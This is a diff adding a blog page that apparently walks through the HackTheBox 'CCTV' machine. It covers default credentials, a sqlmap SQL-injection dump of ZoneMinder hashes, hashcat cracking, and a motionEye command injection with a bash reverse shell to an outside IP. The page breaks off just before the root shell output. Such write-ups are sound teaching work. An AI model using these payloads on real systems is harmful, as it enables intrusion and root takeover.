@@ -1,0 +1,696 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CCTV | Youssef Kessentini — Reverse Koat Shell</title><meta name="author" content="Youssef Kessentini"><meta name="copyright" content="Youssef Kessentini"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="HTB Easy Linux machine — default creds into ZoneMinder, time-based SQL injection (CVE-2024-51482) to dump password hashes, and root via motionEye command injection (CVE-2025-60787)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CCTV">
+<meta property="og:url" content="https://kessentini-youssef.dev/2026/07/11/CCTV/">
+<meta property="og:site_name" content="Youssef Kessentini — Reverse Koat Shell">
+<meta property="og:description" content="HTB Easy Linux machine — default creds into ZoneMinder, time-based SQL injection (CVE-2024-51482) to dump password hashes, and root via motionEye command injection (CVE-2025-60787)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kessentini-youssef.dev/img/cctv-cover.png">
+<meta property="article:published_time" content="2026-07-11T16:30:00.000Z">
+<meta property="article:modified_time" content="2026-07-11T16:46:18.775Z">
+<meta property="article:author" content="Youssef Kessentini">
+<meta property="article:tag" content="CVE-2024-51482">
+<meta property="article:tag" content="CVE-2025-60787">
+<meta property="article:tag" content="Command Injection">
+<meta property="article:tag" content="Credential Cracking">
+<meta property="article:tag" content="Default Creds">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="SQL Injection">
+<meta property="article:tag" content="ZoneMinder">
+<meta property="article:tag" content="motionEye">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kessentini-youssef.dev/img/cctv-cover.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CCTV",
+  "url": "https://kessentini-youssef.dev/2026/07/11/CCTV/",
+  "image": "https://kessentini-youssef.dev/img/cctv-cover.png",
+  "datePublished": "2026-07-11T16:30:00.000Z",
+  "dateModified": "2026-07-11T16:46:18.775Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Youssef Kessentini",
+      "url": "https://github.com/0xkoat"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="https://kessentini-youssef.dev/2026/07/11/CCTV/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&amp;family=Space+Grotesk:wght@400;600;700&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"Author: Youssef Kessentini","link":"Link: ","source":"Source: Youssef Kessentini — Reverse Koat Shell","info":"Copyright belongs to the author. For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source."}},
+  lightbox: 'medium_zoom',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#9fef00","bgDark":"#1a2a1a","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CCTV',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="google-site-verification" content="rRa4aufVpnogE8yslZ22DTeTCHohhwetcyBS3-HMHHI" /><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Youssef Kessentini — Reverse Koat Shell" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/avatar.png'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-flag"></i><span> Writeups</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/HTB-Machines/"><i class="fa-fw fas fa-server"></i><span> HTB Machines</span></a></li><li><a class="site-page child" href="/categories/HTB-Challenges/"><i class="fa-fw fas fa-puzzle-piece"></i><span> HTB Challenges</span></a></li><li><a class="site-page child" href="/categories/CTF-Writeups/"><i class="fa-fw fas fa-trophy"></i><span> CTF Writeups</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/Portswigger/"><i class="fa-fw fas fa-bug"></i><span> Portswigger</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Projects/"><i class="fa-fw fas fa-project-diagram"></i><span> Projects</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Events/"><i class="fa-fw fas fa-calendar-alt"></i><span> Events</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-secret"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/cctv-cover.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Youssef Kessentini — Reverse Koat Shell</span></a><a class="nav-page-title" href="/"><span class="site-name">CCTV</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-flag"></i><span> Writeups</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/HTB-Machines/"><i class="fa-fw fas fa-server"></i><span> HTB Machines</span></a></li><li><a class="site-page child" href="/categories/HTB-Challenges/"><i class="fa-fw fas fa-puzzle-piece"></i><span> HTB Challenges</span></a></li><li><a class="site-page child" href="/categories/CTF-Writeups/"><i class="fa-fw fas fa-trophy"></i><span> CTF Writeups</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/Portswigger/"><i class="fa-fw fas fa-bug"></i><span> Portswigger</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Projects/"><i class="fa-fw fas fa-project-diagram"></i><span> Projects</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Events/"><i class="fa-fw fas fa-calendar-alt"></i><span> Events</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-secret"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CCTV</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-07-11T16:30:00.000Z" title="Created 2026-07-11 17:30:00">2026-07-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-07-11T16:46:18.775Z" title="Updated 2026-07-11 17:46:18">2026-07-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HackTheBox/">HackTheBox</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;This writeup is&quot;,&quot;messageNext&quot;:&quot;days old. Some techniques may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2026-07-11 17:46:18&quot;}" hidden></div><blockquote>
+<p><strong>Difficulty</strong>: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; <strong>OS</strong>: <span style="color:#9fef00">Linux</span></p>
+</blockquote>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This machine demonstrates how chaining two recent vulnerabilities in <strong>ZoneMinder</strong> and <strong>motionEye</strong> leads to full root compromise. Starting from default credentials, a time-based SQL injection (<strong>CVE-2024-51482</strong>) was used to extract user hashes, followed by credential reuse and an OS command injection (<strong>CVE-2025-60787</strong>) to gain root access.</p>
+<p>This walkthrough covers a realistic attack chain from initial access all the way to full system compromise.</p>
+<span id="more"></span>
+
+<hr>
+<h2 id="1-Reconnaissance"><a href="#1-Reconnaissance" class="headerlink" title="1. Reconnaissance"></a>1. Reconnaissance</h2><p>The engagement began with standard service discovery. A quick <code>nmap</code> scan revealed two open ports:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sV 10.129.26.87</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-05 16:29 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.26.87</span><br><span class="line">Host is up (0.072s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.58</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.81 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Port 22 (SSH):</strong> OpenSSH 9.6p1</li>
+<li><strong>Port 80 (HTTP):</strong> Apache 2.4.58</li>
+</ul>
+<p>After adding <code>cctv.htb</code> to my <code>/etc/hosts</code> file, I navigated to the web server and was greeted by a <strong>ZoneMinder v1.37.63</strong> login page.</p>
+<p><img src="/img/cctv-zm-login.png" alt="ZoneMinder v1.37.63 console, logged in with admin:admin" loading='lazy'></p>
+<p>In a classic “low-hanging fruit” moment, default credentials (<code>admin:admin</code>) worked perfectly, granting me access to the console. This highlights a common real-world misconfiguration where publicly exposed services rely on unchanged default credentials, effectively bypassing authentication controls.</p>
+<hr>
+<h2 id="2-Exploitation-—-CVE-2024-51482-ZoneMinder-Time-Based-SQLi"><a href="#2-Exploitation-—-CVE-2024-51482-ZoneMinder-Time-Based-SQLi" class="headerlink" title="2. Exploitation — CVE-2024-51482 (ZoneMinder Time-Based SQLi)"></a>2. Exploitation — CVE-2024-51482 (ZoneMinder Time-Based SQLi)</h2><p>Knowing that ZoneMinder has had its share of vulnerabilities, I looked for recent CVEs and identified <strong>CVE-2024-51482</strong>, a time-based blind SQL injection in the <code>tid</code> parameter.</p>
+<h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>The vulnerable code lives in <code>web/ajax/event.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;removetag&#x27;</span> :</span><br><span class="line">    <span class="variable">$tagId</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;tid&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">dbQuery</span>(<span class="string">&#x27;DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$tagId</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]));</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM Events_Tags WHERE TagId = <span class="subst">$tagId</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$rowCount</span> = <span class="title function_ invoke__">dbNumRows</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$rowCount</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&#x27;DELETE FROM Tags WHERE Id = ?&#x27;</span>;</span><br><span class="line">      <span class="variable">$values</span> = <span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;tid&#x27;</span>]);</span><br><span class="line">      <span class="variable">$response</span> = <span class="title function_ invoke__">dbNumRows</span>(<span class="variable">$sql</span>, <span class="variable">$values</span>);</span><br><span class="line">      <span class="title function_ invoke__">ajaxResponse</span>(<span class="keyword">array</span>(<span class="string">&#x27;response&#x27;</span>=&gt;<span class="variable">$response</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$tagId</code> is concatenated directly into <code>$sql</code> without any parameterization or sanitization. Since no output is reflected back to the user, exploitation relies on time-based techniques (e.g. <code>SLEEP()</code>) to infer data through response delays — a boolean&#x2F;time-based blind injection.</p>
+<p><strong>Vulnerable endpoint:</strong></p>
+<figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dumping-the-Database"><a href="#Dumping-the-Database" class="headerlink" title="Dumping the Database"></a>Dumping the Database</h3><p>To exploit this, I grabbed my <code>ZMSESSID</code> cookie (<code>F12</code> → <strong>Inspect</strong> → <strong>Application</strong> tab → <strong>Storage</strong> → <strong>Cookies</strong>) and fired up <code>sqlmap</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sqlmap -u <span class="string">&quot;http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1&quot;</span> \</span><br><span class="line">  --cookie=<span class="string">&quot;ZMSESSID=[REDACTED]&quot;</span> --dump -T Users -D zm</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap identified the injection point by detecting delayed responses, confirming a time-based blind SQL injection. This method is inherently slow since each bit of data is inferred through timing differences rather than direct output — but it got there:</p>
+<figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[16:54:16] [INFO] resumed: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApWxcIFQcURnm5N.rhlULwM0jrtbm</span><br><span class="line">[16:54:16] [INFO] resumed: superadmin</span><br><span class="line">[16:54:16] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............. (done)</span><br><span class="line">[16:54:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent po</span><br><span class="line">tential disruptions</span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? [Y/n] Y</span><br><span class="line">05prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.</span><br><span class="line">[16:58:51] [INFO] retrieved: mark</span><br><span class="line">[16:59:07] [INFO] retrieved: $2y$10$t5z8uIT.n9uCdHCNidcLF.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m</span><br><span class="line"></span><br><span class="line">Database: zm</span><br><span class="line">Table: Users</span><br><span class="line">[3 entries]</span><br><span class="line">+------------+--------------------------------------------------------------+</span><br><span class="line">| Username   | Password                                                      |</span><br><span class="line">+------------+--------------------------------------------------------------+</span><br><span class="line">| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApWxcIFQcURnm5N.rhlULwM0jrtbm   |</span><br><span class="line">| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.  |</span><br><span class="line">| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLF.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m   |</span><br><span class="line">+------------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Three bcrypt hashes recovered: <code>superadmin</code>, <code>mark</code>, and <code>admin</code>.</p>
+<hr>
+<h2 id="3-Cracking-and-Lateral-Movement"><a href="#3-Cracking-and-Lateral-Movement" class="headerlink" title="3. Cracking and Lateral Movement"></a>3. Cracking and Lateral Movement</h2><p>I focused on <code>mark</code>‘s hash. The extracted hashes were bcrypt, which is intentionally slow to resist brute-force attacks. Using <code>hashcat</code> with <code>rockyou.txt</code>, the password for user <code>mark</code> was successfully cracked:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ hashcat -m 3200 mark_hash.txt /home/kali/Downloads/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))</span><br><span class="line">Hash.Target......: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.</span><br><span class="line">...</span><br><span class="line">Candidates.#01...: possum -&gt; fatboy1</span><br><span class="line">...</span><br><span class="line">$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame</span><br><span class="line"></span><br><span class="line">Status...........: Cracked</span><br></pre></td></tr></table></figure>
+
+<p>Password for <code>mark</code> cracked as <code>opensesame</code> — indicating weak password selection despite strong hashing. Strong hashing alone is insufficient if users choose predictable passwords.</p>
+<p>With these credentials I established an SSH session:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh mark@cctv.htb</span><br></pre></td></tr></table></figure>
+
+<p>Once inside, I checked for internal services with <code>ss -tlnp</code> and discovered <strong>motionEye</strong> running locally on port <strong>8765</strong>. This demonstrates a common security assumption: services bound to localhost are considered safe. However, once SSH access is obtained, these internal services become reachable and exploitable.</p>
+<p>To reach the dashboard from my local machine, I set up an SSH tunnel (used local port <code>8766</code> since <code>8765</code> was already taken on my machine):</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh -N -L 127.0.0.1:8766:127.0.0.1:8766 mark@cctv.htb</span><br></pre></td></tr></table></figure>
+
+<p>Navigating to <code>http://127.0.0.1:8766</code> brought me to the motionEye login page.</p>
+<hr>
+<h2 id="4-Privilege-Escalation-—-CVE-2025-60787-motionEye-Command-Injection"><a href="#4-Privilege-Escalation-—-CVE-2025-60787-motionEye-Command-Injection" class="headerlink" title="4. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)"></a>4. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)</h2><p>To log in as admin, I read the <code>motion.conf</code> file on the target, which contained the admin password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mark@cctv:~$ <span class="built_in">cat</span> /etc/motioneye/motion.conf</span><br><span class="line"><span class="comment"># @admin_username admin</span></span><br><span class="line"><span class="comment"># @normal_username user</span></span><br><span class="line"><span class="comment"># @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0</span></span><br><span class="line"><span class="comment"># @lang en</span></span><br><span class="line"><span class="comment"># @enabled on</span></span><br><span class="line"><span class="comment"># @normal_password</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h3><p><strong>CVE-2025-60787</strong> is a command injection vulnerability in motionEye. The web UI accepts arbitrary strings for fields such as <strong>Image File Name</strong> and writes them directly into <code>/etc/motioneye/camera-*.conf</code>. When motionEye restarts the underlying <code>motion</code> binary, these fields are treated as shell-expandable — so injected <code>$()</code>&#x2F;backtick syntax executes as a shell command.</p>
+<figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dashboard (Web UI)</span><br><span class="line">      ↓</span><br><span class="line">ConfigHandler.set_config()</span><br><span class="line">      ↓</span><br><span class="line">camera-*.conf written (unsanitized)</span><br><span class="line">      ↓</span><br><span class="line">motionctl.restart()</span><br><span class="line">      ↓</span><br><span class="line">motion parses config → executes payload</span><br></pre></td></tr></table></figure>
+
+<p>The web UI has <strong>client-side only</strong> JavaScript validation blocking shell metacharacters in the filename field — the server never re-validates the input. This is a classic trust boundary violation.</p>
+<h3 id="The-Bypass"><a href="#The-Bypass" class="headerlink" title="The Bypass"></a>The Bypass</h3><p>I opened the browser console (<code>F12</code>) and redefined the validation function so it always passes:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">configUiValid = <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/cctv-bypass-validation.png" alt="Redefining the client-side validation function" loading='lazy'></p>
+<p>With the restriction lifted, I injected a reverse shell payload into <strong>Still Images → Image File Name</strong>, keeping the required <code>.%Y-%m-%d-%H-%M-%S</code> suffix so the field still “looks” valid to the app:</p>
+<figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python3 -c &#x27;import os;os.system(&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.15.36/4444 0&gt;&amp;1\&quot;&quot;&#x27;)).%Y-%m-%d-%H-%M-%S</span><br></pre></td></tr></table></figure>
+
+<p>The payload is wrapped in <code>$()</code> to force command execution in a subshell, while preserving the filename format expected by the application.</p>
+<p><img src="/img/cctv-payload-upload.png" alt="Injecting the reverse shell payload into Image File Name" loading='lazy'></p>
+<h3 id="Triggering-Root"><a href="#Triggering-Root" class="headerlink" title="Triggering Root"></a>Triggering Root</h3><p>The payload only executes when a snapshot is actually taken. Since <code>motion</code> runs as <strong>root</strong>, this is the critical misconfiguration that enables privilege escalation — any command executed through this interface inherits root privileges, turning a simple command injection into a full system compromise.</p>
+<p>I triggered the snapshot via the internal API:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mark@cctv:~$ curl <span class="string">&quot;http://127.0.0.1:7999/1/action/snapshot&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Immediately, my listener caught the connection:</p>
